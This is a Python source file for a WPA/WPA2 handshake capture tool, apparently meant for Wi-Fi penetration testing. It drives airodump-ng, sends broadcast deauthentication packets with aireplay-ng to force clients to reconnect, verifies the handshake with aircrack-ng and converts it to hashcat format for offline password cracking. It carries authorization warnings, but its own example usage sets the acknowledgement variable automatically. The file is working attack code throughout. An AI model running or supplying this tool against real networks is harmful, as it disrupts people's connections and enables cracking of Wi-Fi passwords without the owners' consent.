"""
WPA/WPA2 Handshake Capture

For authorized security testing only!
Captures 4-way handshakes for security analysis.

Similar to: airodump-ng capture, Wireshark
"""

import subprocess
import time
import re
import os
from typing import Optional, Dict, List
from dataclasses import dataclass
from pathlib import Path
import logging
from enum import Enum

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class HandshakeStatus(Enum):
    """Handshake capture status"""
    NOT_STARTED = "not_started"
    CAPTURING = "capturing"
    PARTIAL = "partial"  # Some EAPOL frames captured
    COMPLETE = "complete"  # Full 4-way handshake
    FAILED = "failed"


@dataclass
class HandshakeResult:
    """Handshake capture result"""
    status: HandshakeStatus
    ssid: str
    bssid: str
    capture_file: Optional[str] = None
    eapol_frames: int = 0
    timestamp: Optional[float] = None
    client_mac: Optional[str] = None


class HandshakeCapture:
    """
    WPA/WPA2 Handshake Capture

    Captures 4-way handshakes for authorized security testing.
    For authorized security testing only!
    """

    def __init__(self, interface: str = "wlan0mon", output_dir: str = "/tmp/handshakes"):
        """
        Initialize handshake capture

        Args:
            interface: Monitor mode interface (e.g., wlan0mon)
            output_dir: Directory to store capture files

        ⚠️ WARNING: Only capture handshakes from networks you have authorization to test!
        """
        self.interface = interface
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Check authorization
        self._check_authorization()

        # Verify monitor mode
        if not self._verify_monitor_mode():
            logger.warning(f"{interface} may not be in monitor mode")

    def _check_authorization(self):
        """Verify user has acknowledged legal warning"""
        if not os.environ.get('WIFI_PENTEST_ACKNOWLEDGED'):
            raise PermissionError(
                "⚠️ You must acknowledge the legal warning before using this tool.\n"
                "See LEGAL_WARNING.md and set WIFI_PENTEST_ACKNOWLEDGED=1"
            )

    def _verify_monitor_mode(self) -> bool:
        """Verify interface is in monitor mode"""
        try:
            result = subprocess.run(
                ['iwconfig', self.interface],
                capture_output=True,
                text=True,
                check=False
            )
            return 'Mode:Monitor' in result.stdout
        except FileNotFoundError:
            logger.warning("iwconfig not found, cannot verify monitor mode")
            return True  # Assume it's correct

    def capture_handshake(
        self,
        target_bssid: str,
        target_ssid: str,
        channel: int,
        timeout: int = 300,
        deauth: bool = True,
        deauth_count: int = 10
    ) -> HandshakeResult:
        """
        Capture WPA/WPA2 handshake from target network

        Args:
            target_bssid: Target AP MAC address
            target_ssid: Target network SSID
            channel: WiFi channel
            timeout: Capture timeout in seconds
            deauth: Whether to send deauth packets to speed up capture
            deauth_count: Number of deauth packets to send

        Returns:
            HandshakeResult with capture status

        ⚠️ WARNING: Only target networks you have authorization to test!
        """
        logger.info(f"Starting handshake capture for {target_ssid} ({target_bssid})")
        logger.info(f"Channel: {channel}, Timeout: {timeout}s, Deauth: {deauth}")

        # Set channel
        self._set_channel(channel)

        # Output file
        timestamp = int(time.time())
        output_prefix = self.output_dir / f"handshake_{target_ssid}_{timestamp}"

        # Start capture
        capture_proc = self._start_capture(target_bssid, str(output_prefix))

        try:
            # Wait for clients to appear
            logger.info("Waiting for clients...")
            time.sleep(5)

            # Optional: Send deauth to force handshake
            if deauth:
                logger.info("Sending deauth packets to force handshake...")
                self._send_deauth(target_bssid, count=deauth_count)

            # Monitor capture
            start_time = time.time()
            while time.time() - start_time < timeout:
                # Check if handshake captured
                status = self._check_handshake(str(output_prefix), target_bssid)

                if status.status == HandshakeStatus.COMPLETE:
                    logger.info(f"✓ Handshake captured successfully!")
                    capture_proc.terminate()
                    return status
                elif status.status == HandshakeStatus.PARTIAL:
                    logger.info(f"Partial handshake ({status.eapol_frames} EAPOL frames)")

                time.sleep(5)

            # Timeout
            logger.warning(f"Capture timed out after {timeout}s")
            capture_proc.terminate()

            # Final check
            status = self._check_handshake(str(output_prefix), target_bssid)
            return status

        except KeyboardInterrupt:
            logger.info("Capture interrupted by user")
            capture_proc.terminate()
            return HandshakeResult(
                status=HandshakeStatus.FAILED,
                ssid=target_ssid,
                bssid=target_bssid
            )
        except Exception as e:
            logger.error(f"Capture error: {e}")
            capture_proc.terminate()
            return HandshakeResult(
                status=HandshakeStatus.FAILED,
                ssid=target_ssid,
                bssid=target_bssid
            )

    def _set_channel(self, channel: int):
        """Set interface channel"""
        try:
            subprocess.run(
                ['iwconfig', self.interface, 'channel', str(channel)],
                check=True,
                capture_output=True
            )
            logger.info(f"Set channel to {channel}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to set channel: {e}")

    def _start_capture(self, bssid: str, output_prefix: str) -> subprocess.Popen:
        """Start airodump-ng capture"""
        cmd = [
            'airodump-ng',
            '--bssid', bssid,
            '--write', output_prefix,
            '--output-format', 'pcap',
            self.interface
        ]

        logger.info(f"Starting capture: {' '.join(cmd)}")

        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        return proc

    def _send_deauth(self, bssid: str, client: str = "FF:FF:FF:FF:FF:FF", count: int = 10):
        """
        Send deauthentication packets

        Args:
            bssid: Target AP MAC
            client: Client MAC (FF:FF:FF:FF:FF:FF for broadcast)
            count: Number of packets to send
        """
        try:
            cmd = [
                'aireplay-ng',
                '--deauth', str(count),
                '-a', bssid,
                '-c', client,
                self.interface
            ]

            subprocess.run(cmd, check=False, capture_output=True, timeout=30)
            logger.info(f"Sent {count} deauth packets")

        except subprocess.TimeoutExpired:
            logger.warning("Deauth command timed out")
        except FileNotFoundError:
            logger.warning("aireplay-ng not found, skipping deauth")
        except Exception as e:
            logger.error(f"Deauth error: {e}")

    def _check_handshake(self, output_prefix: str, bssid: str) -> HandshakeResult:
        """
        Check if handshake was captured

        Args:
            output_prefix: Capture file prefix
            bssid: Target BSSID

        Returns:
            HandshakeResult with status
        """
        cap_file = f"{output_prefix}-01.cap"

        if not os.path.exists(cap_file):
            return HandshakeResult(
                status=HandshakeStatus.NOT_STARTED,
                ssid="",
                bssid=bssid
            )

        try:
            # Use aircrack-ng to check handshake
            result = subprocess.run(
                ['aircrack-ng', cap_file],
                capture_output=True,
                text=True,
                timeout=10
            )

            output = result.stdout + result.stderr

            # Parse output
            if 'handshake' in output.lower():
                # Count EAPOL frames
                eapol_count = self._count_eapol_frames(output)

                if eapol_count >= 4:
                    # Full handshake
                    ssid = self._extract_ssid(output)
                    client = self._extract_client(output)

                    return HandshakeResult(
                        status=HandshakeStatus.COMPLETE,
                        ssid=ssid,
                        bssid=bssid,
                        capture_file=cap_file,
                        eapol_frames=eapol_count,
                        timestamp=time.time(),
                        client_mac=client
                    )
                else:
                    # Partial handshake
                    return HandshakeResult(
                        status=HandshakeStatus.PARTIAL,
                        ssid="",
                        bssid=bssid,
                        capture_file=cap_file,
                        eapol_frames=eapol_count
                    )
            else:
                # No handshake yet
                return HandshakeResult(
                    status=HandshakeStatus.CAPTURING,
                    ssid="",
                    bssid=bssid,
                    capture_file=cap_file
                )

        except subprocess.TimeoutExpired:
            logger.warning("Handshake check timed out")
            return HandshakeResult(
                status=HandshakeStatus.CAPTURING,
                ssid="",
                bssid=bssid,
                capture_file=cap_file
            )
        except FileNotFoundError:
            logger.error("aircrack-ng not found")
            return HandshakeResult(
                status=HandshakeStatus.FAILED,
                ssid="",
                bssid=bssid
            )
        except Exception as e:
            logger.error(f"Handshake check error: {e}")
            return HandshakeResult(
                status=HandshakeStatus.FAILED,
                ssid="",
                bssid=bssid
            )

    def _count_eapol_frames(self, aircrack_output: str) -> int:
        """Count EAPOL frames from aircrack output"""
        # Look for patterns like "1 handshake" or "4 EAPOL"
        matches = re.findall(r'(\d+)\s+(?:handshake|EAPOL)', aircrack_output, re.IGNORECASE)
        if matches:
            return max(int(m) for m in matches)
        return 0

    def _extract_ssid(self, aircrack_output: str) -> str:
        """Extract SSID from aircrack output"""
        match = re.search(r'ESSID:\s*([^\n]+)', aircrack_output)
        if match:
            return match.group(1).strip()
        return ""

    def _extract_client(self, aircrack_output: str) -> Optional[str]:
        """Extract client MAC from aircrack output"""
        match = re.search(r'Station:\s*([0-9A-Fa-f:]{17})', aircrack_output)
        if match:
            return match.group(1)
        return None

    def verify_handshake(self, capture_file: str, bssid: str) -> bool:
        """
        Verify captured handshake is valid

        Args:
            capture_file: Path to capture file
            bssid: Target BSSID

        Returns:
            True if valid handshake
        """
        result = self._check_handshake(capture_file.replace('-01.cap', ''), bssid)
        return result.status == HandshakeStatus.COMPLETE

    def list_captured_handshakes(self) -> List[Dict]:
        """
        List all captured handshakes

        Returns:
            List of handshake info dictionaries
        """
        handshakes = []

        for cap_file in self.output_dir.glob("*.cap"):
            # Parse filename
            name = cap_file.stem
            parts = name.split('_')

            if len(parts) >= 3:
                ssid = parts[1]
                timestamp = parts[2]

                handshakes.append({
                    'file': str(cap_file),
                    'ssid': ssid,
                    'timestamp': timestamp,
                    'size': cap_file.stat().st_size
                })

        return handshakes

    def convert_to_hashcat(self, capture_file: str, output_file: str) -> bool:
        """
        Convert capture to hashcat format

        Args:
            capture_file: Input .cap file
            output_file: Output .hccapx file

        Returns:
            True if conversion successful
        """
        try:
            # Use cap2hccapx or hcxpcapngtool
            # Try hcxpcapngtool first (newer)
            result = subprocess.run(
                ['hcxpcapngtool', '-o', output_file, capture_file],
                capture_output=True,
                check=False
            )

            if result.returncode == 0:
                logger.info(f"Converted to hashcat format: {output_file}")
                return True

            # Fallback to cap2hccapx
            result = subprocess.run(
                ['cap2hccapx', capture_file, output_file],
                capture_output=True,
                check=False
            )

            if result.returncode == 0:
                logger.info(f"Converted to hashcat format: {output_file}")
                return True

            logger.error("Failed to convert to hashcat format")
            return False

        except FileNotFoundError:
            logger.error("Conversion tool not found (hcxpcapngtool or cap2hccapx)")
            return False
        except Exception as e:
            logger.error(f"Conversion error: {e}")
            return False


# Example usage
if __name__ == "__main__":
    import os
    os.environ['WIFI_PENTEST_ACKNOWLEDGED'] = '1'

    print("\n⚠️  AUTHORIZED SECURITY TESTING ONLY ⚠️\n")
    print("Ensure you have written authorization to test this network!\n")

    # Example: Capture handshake
    capturer = HandshakeCapture(interface="wlan0mon", output_dir="/tmp/handshakes")

    # Target network info (from previous scan)
    target_bssid = "00:11:22:33:44:55"
    target_ssid = "TestNetwork"
    channel = 6

    # Capture handshake
    result = capturer.capture_handshake(
        target_bssid=target_bssid,
        target_ssid=target_ssid,
        channel=channel,
        timeout=300,
        deauth=True
    )

    if result.status == HandshakeStatus.COMPLETE:
        print(f"\n✓ Successfully captured handshake!")
        print(f"  SSID: {result.ssid}")
        print(f"  BSSID: {result.bssid}")
        print(f"  Client: {result.client_mac}")
        print(f"  File: {result.capture_file}")
        print(f"  EAPOL frames: {result.eapol_frames}")

        # Convert for hashcat
        hashcat_file = result.capture_file.replace('.cap', '.hccapx')
        if capturer.convert_to_hashcat(result.capture_file, hashcat_file):
            print(f"  Hashcat file: {hashcat_file}")
    else:
        print(f"\n✗ Handshake capture failed: {result.status.value}")
